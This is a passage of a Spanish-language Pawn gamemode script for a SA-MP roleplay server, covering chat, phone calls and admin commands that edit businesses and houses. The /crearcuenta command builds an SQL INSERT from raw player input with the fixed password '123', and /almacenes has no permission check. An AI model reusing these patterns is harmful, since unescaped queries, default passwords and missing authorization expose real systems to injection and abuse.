        ColgarTelefono(playerid);
    }
    if(EnLlamada[playerid] == 2 || EnLlamada[playerid] == 3 || EnLlamada[playerid] == 912) //Teléfono llamada normal o emergencias
	{
		format(string, sizeof(string), "(Teléfono): %s", text);
		SendClientMessage(PersonaEnLlamada[playerid], Amarillo, string);
		format(string, sizeof(string), "(Teléfono) %s dice: %s", Nombre, text);
		ProxDetector(8.0, playerid,string,Chat1,Chat2,Chat3,Chat4,Chat5);
		return 0;
	}
    //Sistema de chat general
    if(ChatNormal)
    {
		new lenguaje[28];
        switch(Idioma[playerid])
        {
            case 0: lenguaje = "";
            case 1: lenguaje = "[ESPAÑOL] ";
            case 2: lenguaje = "[ALEMÁN] ";
            case 3: lenguaje = "[JAPONÉS] ";
            case 4: lenguaje = "[ITALIANO] ";
            case 5: lenguaje = "[RUSO] ";
            case 6: lenguaje = "[ÁRABE] ";
            case 7: lenguaje = "[FRANCÉS] ";
            case 8: lenguaje = "[CHINO] ";
            case 9: lenguaje = "[PORTUGUÉS] ";
        }
	    if(!IsPlayerInAnyVehicle(playerid)) //Si no está en un vehículo
		{
	        format(string, sizeof(string), "%s%s dice: %s", lenguaje, Nombre, text);
	 	    ProxDetector(15.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
	    }
		else
		{
			new carid = GetPlayerVehicleID(playerid);
			if(IsABike(carid) || IsAMBike(carid) || IsAPizzaBike(carid) || IsABoat(carid)) //Si está en un vehiculo sin cabina
	        {
			    format(string, sizeof(string), "%s%s dice: %s", lenguaje, Nombre, text);
			    ProxDetector(15.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
			}
			else //Si está en un vehiculo con cabina
			{
	            if(VehicleWindows[GetPlayerVehicleID(playerid)] == 0)
			    {
	                format(string, sizeof(string), "(Ventana Cerrada) %s%s dice: %s", lenguaje, Nombre, text);
			    	ProxDetector(5.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
	            }
				else
				{
	                format(string, sizeof(string), "(Ventana Abierta) %s%s dice: %s", lenguaje, Nombre, text);
			    	ProxDetector(15.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
				}
			}
		}
		return 0;
	}
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[])
{
if(Anims_OnPlayerCommandText(playerid, cmdtext)) return 1;
new string[128];
new cmd[128];
new tmp[128];
new idx;
new playerid2;
new Nombre2[MAX_PLAYER_NAME];
new Nombre[MAX_PLAYER_NAME];
cmd = strtok(cmdtext, idx);


//----------COMANDOS ADMIN----------//

if(strcmp(cmd, "/crearcuenta", true) == 0) //Comando para crear cuentas directamente
{
    if(PlayerInfo[playerid][pAdmin] == 5)
    {
        new length = strlen(cmdtext);
        while ((idx < length) && (cmdtext[idx] <= ' '))
        {
            idx++;
        }
        new offset = idx;
        new result[MAX_PLAYER_NAME];
        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
        {
            result[idx - offset] = cmdtext[idx];
            idx++;
        }
        result[idx - offset] = EOS;
        if(!strlen(result))
        {
            SendClientMessage(playerid, Naranja, "* /Crearcuenta [Nombre]");
            return 1;
        }
        format(string,sizeof(string),"INSERT INTO usuarios (Nombre, Contra) VALUES ('%s','123')",result);
        mysql_query(1, string);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/gotonego", true) == 0) //Comando para ir a la entrada de un negocio
{
    if(PlayerInfo[playerid][pAdmin] < 5){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /GotoNego [ID]");
		return 1;
	}
	new n = strval(tmp);
	if(!strlen(NegoInfo[n][nNombre])){SendClientMessage(playerid, Rojo, "* Negocio no encontrado."); return 1;}
	SetPlayerPos(playerid, NegoInfo[n][nEntradaX], NegoInfo[n][nEntradaY], NegoInfo[n][nEntradaZ]);
	SetPlayerVirtualWorld(playerid, NegoInfo[n][nVirtualWorld2]);
	SetPlayerInterior(playerid, NegoInfo[n][nInterior2]);
	format(string, sizeof(string), "Teleportado a la entrada del negocio %d.", n);
	SendClientMessage(playerid, AzulClaro, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/getnegoid", true) == 0) //Comando paraconseguir la id de un negocio
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    new i = GetPlayerFueraPuertaNego(playerid);
	if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
	format(string, sizeof(string), "Negocio ID: %d", i);
	SendClientMessage(playerid, AzulClaro, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------
if(strcmp(cmd, "/almacenes", true) == 0) //Comando para editar características de un negocio
{
	for(new x=0; x<=TotalNegs; x++)
	{
	    NegoInfo[x][nMaxAlmacen] = 10;
	    SaveNegocios(x);
	}
}

if(strcmp(cmd, "/editnego", true) == 0) //Comando para editar características de un negocio
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /EditNego [Opcion]");
		SendClientMessage(playerid, Naranja, "Opciones: Entrada, Valor, Interior, VW, Nombre, Comprado, Cerrado, Tipo, MaxAlmacen");
		return 1;
	}
	new i = GetPlayerFueraPuertaNego(playerid);
	if(strcmp(tmp, "Entrada", true) == 0)
	{
	    if(EditNegoPos[playerid] == 0)
	    {
	        if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
		    format(string, sizeof(string), "* Editando la entrada del negocio #%d. Vuelve a escribir este comando para confirmar la posición.", i);
		    SendClientMessage(playerid, Amarillo, string);
		    EditNegoPos[playerid] = i;
		    return 1;
	    }
	    else
	    {
	        i = EditNegoPos[playerid];
	        new Float:ppos[3];
	        GetPlayerPos(playerid, ppos[0], ppos[1], ppos[2]);
	        format(string, sizeof(string), "* Entrada del negocio #%d cambiada a X:%f Y:%f Z:%f.", i, ppos[0], ppos[1], ppos[2]);
		    SendClientMessage(playerid, Amarillo, string);
		    EditNegoPos[playerid] = 0;
			NegoInfo[i][nEntradaX] = ppos[0];
			NegoInfo[i][nEntradaY] = ppos[1];
			NegoInfo[i][nEntradaZ] = ppos[2];
			UpdateNegocioLabel(i);
			SaveNegocios(i);
		    return 1;
	    }
	}
	if(strcmp(tmp, "Comprado", true) == 0)
	{
	    if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditNego Comprado [0 En Venta | 1 Comprado]");
			return 1;
		}
		new var;
		var = strval(tmp);
		NegoInfo[i][nComprado] = var;
		UpdateNegocioLabel(i);
		SaveNegocios(i);
	    return 1;
	}
	if(strcmp(tmp, "Cerrado", true) == 0)
	{
	    if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditNego Cerrado [0 Abierto | 1 Cerrado]");
			return 1;
		}
		new var;
		var = strval(tmp);
		NegoInfo[i][nCerrado] = var;
		UpdateNegocioLabel(i);
		SaveNegocios(i);
	    return 1;
	}
	if(strcmp(tmp, "MaxAlmacen", true) == 0)
	{
	    if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditNego MaxAlmacen [Slots]");
			return 1;
		}
		new var;
		var = strval(tmp);
		if(var < 1 || var > 25){SendClientMessage(playerid, Rojo, "* El máximo de slots debe estar entre 1 y 25."); return 1;}
		NegoInfo[i][nMaxAlmacen] = var;
		SaveNegocios(i);
	    return 1;
	}
	if(strcmp(tmp, "Valor", true) == 0)
	{
	    if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditNego Valor [Precio]");
			return 1;
		}
		new precio;
		precio = strval(tmp);
		NegoInfo[i][nValor] = precio;
		UpdateNegocioLabel(i);
		SaveNegocios(i);
		return 1;
	}
	if(strcmp(tmp, "VW", true) == 0)
	{
	    if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditNego VW [Virtual World]");
			return 1;
		}
		new vw;
		vw = strval(tmp);
		NegoInfo[i][nVirtualWorld] = vw;
		SaveNegocios(i);
		return 1;
	}
	if(strcmp(tmp, "Nombre", true) == 0)
	{
	    if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
		new length = strlen(cmdtext);
	    while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[MAX_PLAYER_NAME];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
	        idx++;
	    }
	    result[idx - offset] = EOS;
	    if(!strlen(result))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditNego Nombre [Texto]");
	        return 1;
	    }
	    new string2[250];
	    format(NegoInfo[i][nNombre], sizeof(result), "%s", result);
	    format(string2, sizeof(string2), "Nombre negocio %d: %s", i, result);
	    SendClientMessage(playerid, Verde, string2);
	    UpdateNegocioLabel(i);
	    SaveNegocios(i);
		return 1;
	}
 	if(strcmp(tmp, "Tipo", true) == 0)
	{
	    if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
	    tmp = strtok(cmdtext, idx);
 		if(!strlen(tmp))
  		{
  		    SendClientMessage(playerid, Naranja, "/EditNego Tipo [Opción]");
  		    SendClientMessage(playerid, Amarillo, "1 Restaurante | 2 Bar | 3 Comida rápida | 4 Discoteca | 5 Puticlub");
			SendClientMessage(playerid, Amarillo, "6 Mecánico | 7 Tienda de armas | 8 24/7 | 9 Tienda de deportes | 10 Ferretería");
			SendClientMessage(playerid, Amarillo, "11 Tienda de ropa | 12 Tienda electrónica | 13 Almacén (NO INT) | 14 Oficina (NO INT) | 15 Casino (PROH)");
			SendClientMessage(playerid, Amarillo, "16 Casa de apuestas | 17 Casa de empeño (NO INT) | 18 Estanco | 19 Licorería | 20 Gimnasio");
			format(string, sizeof(string), "Tipo de negocio actual: %d", NegoInfo[i][nTipo]);
			SendClientMessage(playerid, Naranja, string);
			return 1;
		}
		new id;
		id = strval(tmp);
		NegoInfo[i][nTipo] = id;
		SaveNegocios(i);
		return 1;
	}
	if(strcmp(tmp, "Interior", true) == 0)
	{
	    if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún negocio a tu alrededor."); return 1;}
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditNego Interior [Opción]");
			SendClientMessage(playerid, Amarillo, "[TIPO 1] 1 Rest A | 2 Rest Chino | 3 Rest B | 4 Rest C (BUG) | 5 Rest Lib City"); //Restaurante
			SendClientMessage(playerid, Amarillo, "[TIPO 2] 1 Bar Sureño | 2 Bar OVNI | 3 Bar Ten Bottles"); //Bar
			SendClientMessage(playerid, Amarillo, "[TIPO 3] 1 Pizzería Idl | 2 Tienda donuts | 3 Burguer Shot | 4 Cucklin Bell"); //Comidas rápidas
			SendClientMessage(playerid, Amarillo, "[TIPO 4] 1 Disco Alhambra"); //Discotecas
			SendClientMessage(playerid, Amarillo, "[TIPO 5] 1 Puti pequeño | 2 Puti grande | 3 Pig Pen | 4 Jizzy club"); //Puticlubs
			SendClientMessage(playerid, Amarillo, "[TIPO 6] 1 Taller A | 2 Taller B | 3 Taller C"); //Talleres
			SendClientMessage(playerid, Amarillo, "[TIPO 7] 1 Ammu A | 2 Ammu B"); //Ammus
			SendClientMessage(playerid, Amarillo, "[TIPO 8] (1 al 6) 24/7"); //24-7
			SendClientMessage(playerid, Amarillo, "[TIPO 9] 1 Tienda deportiva"); //Tienda deporte
			
			SendClientMessage(playerid, Amarillo, "[TIPO 11] 1 Binco | 2 Zip | 3 Didier Sanch | 4 Victim | 5 Suburban | 6 Prolaps"); //Tiendas ropa
			
			
			
			
			SendClientMessage(playerid, Amarillo, "[TIPO 16] 1 Casa apuestas grande | 2 Casa apuestas pequeña"); //Casa apuestas
			
			
			
			SendClientMessage(playerid, Amarillo, "[TIPO 20] 1 Gym LS | 2 Gym Sf | 3 Gym LV"); //Gimnasios
			return 1;
		}
		new inter;
		inter = strval(tmp);
		
        if(NegoInfo[i][nTipo] == 1) //Restaurante
        {
            switch(inter)
            {
                case 1:
                {
					NegoInfo[i][nSalidaX] = 459.0624;
		        	NegoInfo[i][nSalidaY] = -110.9772;
		        	NegoInfo[i][nSalidaZ] = 999.4406;
		        	NegoInfo[i][nInterior] = 5;
				}
				case 2:
                {
					NegoInfo[i][nSalidaX] = 2264.8516;
		        	NegoInfo[i][nSalidaY] = 1615.3269;
		        	NegoInfo[i][nSalidaZ] = 1637.9478;
		        	NegoInfo[i][nInterior] = 1;
				}
				case 3:
                {
					NegoInfo[i][nSalidaX] = 460.0901;
		        	NegoInfo[i][nSalidaY] = -88.6293;
		        	NegoInfo[i][nSalidaZ] = 999.5547;
		        	NegoInfo[i][nInterior] = 4;
				}
				case 4:
                {
					NegoInfo[i][nSalidaX] = 442.1236;
		        	NegoInfo[i][nSalidaY] = -50.0158;
		        	NegoInfo[i][nSalidaZ] = 999.7260;
		        	NegoInfo[i][nInterior] = 6;
				}
				case 5:
                {
					NegoInfo[i][nSalidaX] = -795.0060;
		        	NegoInfo[i][nSalidaY] = 489.9904;
		        	NegoInfo[i][nSalidaZ] = 1376.1953;
		        	NegoInfo[i][nInterior] = 1;
				}
            }
        }
        else if(NegoInfo[i][nTipo] == 2) //Bar
        {
            switch(inter)
            {
                case 1: //Bar sureño
                {
					NegoInfo[i][nSalidaX] = 681.4940;
		        	NegoInfo[i][nSalidaY] = -446.8011;
		        	NegoInfo[i][nSalidaZ] = -25.6098;
		        	NegoInfo[i][nInterior] = 1;
				}
                case 2: //Bar ovnis
                {
					NegoInfo[i][nSalidaX] = -228.8182;
		        	NegoInfo[i][nSalidaY] = 1401.2648;
		        	NegoInfo[i][nSalidaZ] = 27.7656;
		        	NegoInfo[i][nInterior] = 18;
				}
				case 3: //Bar ganton
                {
					NegoInfo[i][nSalidaX] = 501.9390;
		        	NegoInfo[i][nSalidaY] = -68.1167;
		        	NegoInfo[i][nSalidaZ] = 998.7578;
		        	NegoInfo[i][nInterior] = 11;
				}
            }
		}
		else if(NegoInfo[i][nTipo] == 3) //Comida rápida
		{
		    switch(inter)
            {
                case 1: //Pizzería idlewood
                {
					NegoInfo[i][nSalidaX] = 372.3232;
		        	NegoInfo[i][nSalidaY] = -133.0604;
		        	NegoInfo[i][nSalidaZ] = 1001.4922;
		        	NegoInfo[i][nInterior] = 5;
				}
				case 2: //Tienda donuts
                {
					NegoInfo[i][nSalidaX] = 377.0908;
		        	NegoInfo[i][nSalidaY] = -192.9837;
		        	NegoInfo[i][nSalidaZ] = 1000.6401;
		        	NegoInfo[i][nInterior] = 17;
				}
				case 3: //Burguer shot
                {
					NegoInfo[i][nSalidaX] = 363.1602;
		        	NegoInfo[i][nSalidaY] = -74.8537;
		        	NegoInfo[i][nSalidaZ] = 1001.5078;
		        	NegoInfo[i][nInterior] = 10;
				}
				case 4: //Cucklin Bell
                {
					NegoInfo[i][nSalidaX] = 364.9234;
		        	NegoInfo[i][nSalidaY] = -11.3165;
		        	NegoInfo[i][nSalidaZ] = 1001.8516;
		        	NegoInfo[i][nInterior] = 9;
				}
            }
		}
		else if(NegoInfo[i][nTipo] == 4) //Discoteca
        {
            switch(inter)
            {
                case 1: //Alhambra
                {
					NegoInfo[i][nSalidaX] = 493.4477;
		        	NegoInfo[i][nSalidaY] = -24.3666;
		        	NegoInfo[i][nSalidaZ] = 1000.6797;
		        	NegoInfo[i][nInterior] = 17;
				}
            }
		}
		else if(NegoInfo[i][nTipo] == 5) //Puticlub
		{
		    switch(inter)
            {
                case 1: //Puti pequeño
                {
					NegoInfo[i][nSalidaX] = 1212.1301;
		        	NegoInfo[i][nSalidaY] = -26.5189;
		        	NegoInfo[i][nSalidaZ] = 1000.9531;
		        	NegoInfo[i][nInterior] = 3;
				}
				case 2: //Puti grande
                {
					NegoInfo[i][nSalidaX] = 965.2302;
		        	NegoInfo[i][nSalidaY] = -53.1638;
		        	NegoInfo[i][nSalidaZ] = 1001.1246;
		        	NegoInfo[i][nInterior] = 3;
				}
				case 3: //Pig pen
                {
					NegoInfo[i][nSalidaX] = 1204.7584;
		        	NegoInfo[i][nSalidaY] = -13.4269;
		        	NegoInfo[i][nSalidaZ] = 1000.9219;
		        	NegoInfo[i][nInterior] = 2;
				}
				case 4: //Jizzy club
                {
					NegoInfo[i][nSalidaX] = -2636.6060;
		        	NegoInfo[i][nSalidaY] = 1402.9683;
		        	NegoInfo[i][nSalidaZ] = 906.4609;
		        	NegoInfo[i][nInterior] = 3;
				}
            }
		}
		else if(NegoInfo[i][nTipo] == 6) //Mecánico
		{
		    switch(inter)
            {
                case 1: //Taller A
                {
					NegoInfo[i][nSalidaX] = 610.0402;
		        	NegoInfo[i][nSalidaY] = -125.1073;
		        	NegoInfo[i][nSalidaZ] = 997.9922;
		        	NegoInfo[i][nTallerSX] = 614.5264;
		        	NegoInfo[i][nTallerSY] = -125.0522;
		        	NegoInfo[i][nTallerSZ] = 997.9922;
		        	NegoInfo[i][nTallerSRotZ] = 270;
		        	NegoInfo[i][nInterior] = 3;
				}
				case 2: //Taller B
                {
					NegoInfo[i][nSalidaX] = 609.7927;
		        	NegoInfo[i][nSalidaY] = -76.6099;
		        	NegoInfo[i][nSalidaZ] = 997.9922;
		        	NegoInfo[i][nTallerSX] = 614.0005;
		        	NegoInfo[i][nTallerSY] = -74.8299;
		        	NegoInfo[i][nTallerSZ] = 997.9922;
		        	NegoInfo[i][nTallerSRotZ] = 270;
		        	NegoInfo[i][nInterior] = 2;
				}
				case 3: //Taller C
                {
					NegoInfo[i][nSalidaX] = 605.7258;
		        	NegoInfo[i][nSalidaY] = -1.5417;
		        	NegoInfo[i][nSalidaZ] = 1000.8956;
		        	NegoInfo[i][nTallerSX] = 610.8098;
		        	NegoInfo[i][nTallerSY] = -1.7114;
		        	NegoInfo[i][nTallerSZ] = 1000.9219;
		        	NegoInfo[i][nTallerSRotZ] = 270;
		        	NegoInfo[i][nInterior] = 1;
				}
            }
		}
		else if(NegoInfo[i][nTipo] == 7) //Tienda de armas
		{
		    switch(inter)
            {
                case 1: //Ammu A
                {
					NegoInfo[i][nSalidaX] = 285.6895;
		        	NegoInfo[i][nSalidaY] = -85.9533;
		        	NegoInfo[i][nSalidaZ] = 1001.5229;
		        	NegoInfo[i][nInterior] = 4;
				}
				case 2: //Ammu B
                {
					NegoInfo[i][nSalidaX] = 296.8696;
		        	NegoInfo[i][nSalidaY] = -111.6349;
		        	NegoInfo[i][nSalidaZ] = 1001.5156;
		        	NegoInfo[i][nInterior] = 6;
				}
            }
		}
		else if(NegoInfo[i][nTipo] == 8) //24/7
		{
		    switch(inter)
		    {
		        case 1:
		        {
		            NegoInfo[i][nSalidaX] = 6.0092;
                	NegoInfo[i][nSalidaY] = -31.6645;
                	NegoInfo[i][nSalidaZ] = 1003.55;
                	NegoInfo[i][nInterior] = 10;
                }
                case 2:
                {
                    NegoInfo[i][nSalidaX] = -25.884498;
                	NegoInfo[i][nSalidaY] = -185.868988;
                	NegoInfo[i][nSalidaZ] = 1003.546875;
                	NegoInfo[i][nInterior] = 17;
                }
                case 3:
                {
                    NegoInfo[i][nSalidaX] = -30.946699;
                	NegoInfo[i][nSalidaY] = -89.609596;
                	NegoInfo[i][nSalidaZ] = 1003.546875;
                	NegoInfo[i][nInterior] = 18;
                }
                case 4:
				{
				    NegoInfo[i][nSalidaX] = 663.3172;
					NegoInfo[i][nSalidaY] = -573.3005;
					NegoInfo[i][nSalidaZ] = 16.3359;
					NegoInfo[i][nInterior] = 0;
				}
				case 5:
				{
				    NegoInfo[i][nSalidaX] = -25.132598;
					NegoInfo[i][nSalidaY] = -140.066986;
					NegoInfo[i][nSalidaZ] = 1003.546875;
					NegoInfo[i][nInterior] = 16;
				}
				case 6:
				{
				    NegoInfo[i][nSalidaX] = -26.691598;
				    NegoInfo[i][nSalidaY] = -56.714897;
				    NegoInfo[i][nSalidaZ] = 1003.546875;
				    NegoInfo[i][nInterior] = 6;
				}
			}
		}
		else if(NegoInfo[i][nTipo] == 9) //Tienda de deportes
		{
            switch(inter)
		    {
		        case 1:
		        {
		            NegoInfo[i][nSalidaX] = -1751.5190;
                	NegoInfo[i][nSalidaY] = 775.8152;
                	NegoInfo[i][nSalidaZ] = 167.6844;
                	NegoInfo[i][nInterior] = 1;
                }
			}
		}
		else if(NegoInfo[i][nTipo] == 10) //Ferretería
		{
            switch(inter)
		    {
		        case 1:
		        {
		            NegoInfo[i][nSalidaX] = -2326.8789;
                	NegoInfo[i][nSalidaY] = 921.6152;
                	NegoInfo[i][nSalidaZ] = 59.7178;
                	NegoInfo[i][nInterior] = 1;
                }
			}
		}
		else if(NegoInfo[i][nTipo] == 11) //Tienda de ropa
		{
	 		switch(inter)
			{
				case 1: // Binco
				{
					NegoInfo[i][nSalidaX] = 207.737991;
		        	NegoInfo[i][nSalidaY] = -109.019996;
		        	NegoInfo[i][nSalidaZ] = 1005.132812;
		        	NegoInfo[i][nInterior] = 15;
				}
				case 2: // Zip
				{
					NegoInfo[i][nSalidaX] = 161.6299;
		        	NegoInfo[i][nSalidaY] = -96.1142;
		        	NegoInfo[i][nSalidaZ] = 1001.8047;
		        	NegoInfo[i][nInterior] = 18;
				}
				case 3: // Didier sachs
				{
					NegoInfo[i][nSalidaX] = 	204.332992;
		        	NegoInfo[i][nSalidaY] = -166.694992;
		        	NegoInfo[i][nSalidaZ] = 1000.523437;
		        	NegoInfo[i][nInterior] = 14;
				}
				case 4: // Victim
				{
					NegoInfo[i][nSalidaX] = 226.293991;
		        	NegoInfo[i][nSalidaY] = -7.431529;
		        	NegoInfo[i][nSalidaZ] = 1002.210937;
		        	NegoInfo[i][nInterior] = 5;
				}
				case 5: // Suburban
				{
					NegoInfo[i][nSalidaX] = 203.777999;
		        	NegoInfo[i][nSalidaY] = -48.492397;
		        	NegoInfo[i][nSalidaZ] = 1001.804687;
		        	NegoInfo[i][nInterior] = 1;
				}
				case 6: // Prolaps
				{
					NegoInfo[i][nSalidaX] = 207.054992;
		        	NegoInfo[i][nSalidaY] = -138.80499;
		        	NegoInfo[i][nSalidaZ] = 1003.507812;
		        	NegoInfo[i][nInterior] = 3;
				}
			}
		}
		else if(NegoInfo[i][nTipo] == 12) //Tienda electrónica
		{
			switch(inter)
		    {
		        case 1:
		        {
		            NegoInfo[i][nSalidaX] = 1004.2385;
                	NegoInfo[i][nSalidaY] = 52.1937;
                	NegoInfo[i][nSalidaZ] = 55.3221;
                	NegoInfo[i][nInterior] = 1;
                }
			}
		}
		else if(NegoInfo[i][nTipo] == 13) //Almacén
		{

		}
		else if(NegoInfo[i][nTipo] == 14) //Oficina
		{

		}
		else if(NegoInfo[i][nTipo] == 15) //Casino
		{

		}
		else if(NegoInfo[i][nTipo] == 16) //Casa de apuestas
		{
		    switch(inter)
            {
                case 1: //Casa apuestas grande
                {
					NegoInfo[i][nSalidaX] = 834.0502;
		        	NegoInfo[i][nSalidaY] = 7.4026;
		        	NegoInfo[i][nSalidaZ] = 1004.1797;
		        	NegoInfo[i][nInterior] = 3;
				}
                case 2: //Casa apuestas pequeña
                {
					NegoInfo[i][nSalidaX] = -2158.5920;
		        	NegoInfo[i][nSalidaY] = 642.8459;
		        	NegoInfo[i][nSalidaZ] = 1052.3750;
		        	NegoInfo[i][nInterior] = 1;
				}
            }
		}
		else if(NegoInfo[i][nTipo] == 17) //Casa de empeño
		{

		}
		else if(NegoInfo[i][nTipo] == 18) //Estanco
		{
            switch(inter)
		    {
		        case 1:
		        {
		            NegoInfo[i][nSalidaX] = 682.7808;
                	NegoInfo[i][nSalidaY] = -665.9598;
                	NegoInfo[i][nSalidaZ] = -46.3000;
                	NegoInfo[i][nInterior] = 1;
                }
			}
		}
		else if(NegoInfo[i][nTipo] == 19) //Licorería
		{
            switch(inter)
		    {
		        case 1:
		        {
		            NegoInfo[i][nSalidaX] = 682.7808;
                	NegoInfo[i][nSalidaY] = -665.9598;
                	NegoInfo[i][nSalidaZ] = -46.3000;
                	NegoInfo[i][nInterior] = 1;
                }
			}
		}
		else if(NegoInfo[i][nTipo] == 20) //Gimnasio
		{
		    switch(inter)
            {
                case 1: //Gym LS
                {
					NegoInfo[i][nSalidaX] = 772.3455;
		        	NegoInfo[i][nSalidaY] = -4.6714;
		        	NegoInfo[i][nSalidaZ] = 1000.7290;
		        	NegoInfo[i][nInterior] = 5;
				}
				case 2: //Gym SF
                {
					NegoInfo[i][nSalidaX] = 774.0042;
		        	NegoInfo[i][nSalidaY] = -49.5956;
		        	NegoInfo[i][nSalidaZ] = 1000.5859;
		        	NegoInfo[i][nInterior] = 6;
				}
				case 3: //Gym LV
                {
					NegoInfo[i][nSalidaX] = 773.9090;
		        	NegoInfo[i][nSalidaY] = -77.9487;
		        	NegoInfo[i][nSalidaZ] = 1000.6615;
		        	NegoInfo[i][nInterior] = 7;
				}
			}
		}
		SaveNegocios(i);
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/edittaller", true) == 0) //Comando para editar características de un taller (negocio)
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /EditTaller [ID (Negocio)] [Opcion]");
		SendClientMessage(playerid, Naranja, "Opciones: TallerEntrada");
		return 1;
	}
	new n = strval(tmp);
	if(NegoInfo[n][nTipo] != 6){SendClientMessage(playerid, Rojo, "* Ese negocio no es un taller."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /EditTaller [ID (Negocio)] [Opcion]");
		SendClientMessage(playerid, Naranja, "Opciones: TallerEntrada");
		return 1;
	}
	if(strcmp(tmp, "TallerEntrada", true) == 0)
	{
	    if(!IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid, Rojo, "* Debes estar en un vehículo."); return 1;}
	    new Float:ppos[3];
	    GetPlayerPos(playerid, ppos[0], ppos[1], ppos[2]);
	    NegoInfo[n][nTallerEX] = ppos[0];
	    NegoInfo[n][nTallerEY] = ppos[1];
	    NegoInfo[n][nTallerEZ] = ppos[2];
     	GetVehicleZAngle(GetPlayerVehicleID(playerid), NegoInfo[n][nTallerERotZ]);
	    format(string, sizeof(string), "Entrada al taller %d cambiada a X:%f Y:%f Z:%f", n, ppos[0], ppos[1], ppos[2]);
	    SendClientMessage(playerid, AzulClaro, string);
	    format(string, sizeof(string), "RotZ vehículos de salida: ", NegoInfo[n][nTallerERotZ]);
	    SendClientMessage(playerid, AzulClaro, string);
	    SaveNegocios(n);
	    return 1;
	}
}


//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/gotocasa", true) == 0) //Comando para ir a la entrada de una casa
{
    if(PlayerInfo[playerid][pAdmin] < 5){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /GotoCasa [ID]");
		return 1;
	}
	new h = strval(tmp);
	if(!strlen(HouseInfo[h][hBarrio])){SendClientMessage(playerid, Rojo, "* Casa no encontrada."); return 1;}
	SetPlayerPos(playerid, HouseInfo[h][hEntradaX], HouseInfo[h][hEntradaY], HouseInfo[h][hEntradaZ]);
	SetPlayerVirtualWorld(playerid, HouseInfo[h][hVirtualWorld2]);
	SetPlayerInterior(playerid, HouseInfo[h][hInterior2]);
	format(string, sizeof(string), "Teleportado a la entrada de la casa %d.", h);
	SendClientMessage(playerid, AzulClaro, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/getcasaid", true) == 0) //Comando para conseguir la id de una casa
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    new i = GetPlayerFueraPuertaCasa(playerid);
	if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningúna casa a tu alrededor."); return 1;}
	format(string, sizeof(string), "Casa ID: %d", i);
	SendClientMessage(playerid, AzulClaro, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/editcasa", true) == 0) //Comando para editar características de una casa
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /EditCasa [Opcion]");
